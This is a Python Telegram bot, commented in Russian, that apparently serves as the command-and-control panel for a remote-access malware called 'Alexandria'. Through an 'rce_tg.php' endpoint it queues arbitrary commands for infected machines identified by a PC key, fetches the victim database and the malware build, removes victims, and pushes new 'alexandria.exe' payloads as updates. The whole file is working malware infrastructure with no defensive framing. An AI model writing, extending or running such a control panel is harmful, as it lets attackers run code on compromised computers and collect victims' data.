import logging
import requests

from aiogram.dispatcher import Dispatcher
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import Dispatcher
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton

# Конфиг
tokenTgBot = ''
botikUrl = ''
fileNameOnServer = 'alexandria.exe'
commands = '''/command [идентификатор] [акт*значение]
/getdatabase
/getbuild
/offline [true|false]
/setcomment [идентификатор] [комментарий]
/remove [идентификатор]
/update [версия] (прикреплённый документ)
'''

# Клавиатура
keyboardsUser = ReplyKeyboardMarkup(resize_keyboard=True).add(
    KeyboardButton(text='/getdatabase', сallback_data="instruction"),
    KeyboardButton(text='/commands', сallback_data="instruction"),
    KeyboardButton(text='/getbuild', сallback_data="instruction")
)

# Подключение бота
logging.basicConfig(level=logging.INFO)
bot = Bot(token=tokenTgBot, parse_mode="HTML")
dp = Dispatcher(bot, storage=MemoryStorage())

# Отправка запроса на сервер + ответ от бота (не круто но удобно)
async def sendRequest(url, message):
    resp = requests.get(url)
    return await message.reply(f'<b>Запрос был отправлен!</b>\n\nКод ответа: {resp.status_code}\nТекст ответа: {resp.text}')

# Ожидание какого-либо документа с подписью
@dp.message_handler(content_types=[types.ContentType.DOCUMENT])
async def process_start_command(message: types.Message):
    words = message.caption.split(' ')
    if words[0].lower() == '/update':
        ver = words[1]
        document = message.document.file_id
        file = await bot.get_file(document)
        file_path = file.file_path
        await bot.download_file(file_path, f"{fileNameOnServer}.exe")
        file = open(f"{fileNameOnServer}.exe", 'rb').read()
        requests.post(f"{botikUrl}/rce_tg.php?postUpdateVer=1", data={'postUpdateVer': ver}, files={'document': file})
        await message.reply('<b>Обновлено.</b>')

# Основные команды
@dp.message_handler()
async def none(message: types.Message):
    words = message.text.split(' ')

    if words[0].lower() == '/command':
        if len(words) >= 3:
            pcKey = words[1]
            command = ''
            for word in words:
                if word.lower() == '/command' or word == pcKey: continue
                command += word + " "

            await sendRequest(f'{botikUrl}/rce_tg.php?pcKey={pcKey}&setCommand={command}', message)

    elif words[0].lower() == '/offline':

        if words[1].lower() == 'false':
            await sendRequest(f'{botikUrl}/rce_tg.php?setOffline=false', message)

        elif words[1].lower() == 'true':
            await sendRequest(f'{botikUrl}/rce_tg.php?setOffline=true', message)

    elif words[0].lower() == '/setcomment':
        if len(words) >= 3:
            pcKey = words[1]
            comment = ''
            for word in words:
                if word.lower() == '/setcomment' or word == pcKey: continue
                comment += word + " "

            await sendRequest(f'{botikUrl}/rce_tg.php?pcKey={pcKey}&setComment={comment}', message)

    elif words[0].lower() == '/remove':
        pcKey = words[1]
        await sendRequest(f'{botikUrl}/rce_tg.php?pcKey={pcKey}&removeDir=1', message)

    elif message.text.lower() == '/getdatabase':
        await sendRequest(f'{botikUrl}/rce_tg.php?getDatabase=1', message)

    elif message.text.lower() == '/commands':
        await message.reply(commands)

    elif message.text.lower() == '/getbuild':
        await sendRequest(f'{botikUrl}/rce_tg.php?getBuild=1', message)

    elif message.text.lower() == '/start':
        await message.reply('<b>Александрия</b> is active...', reply_markup=keyboardsUser)

# Запуск бота
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)


# //coded by @loveappless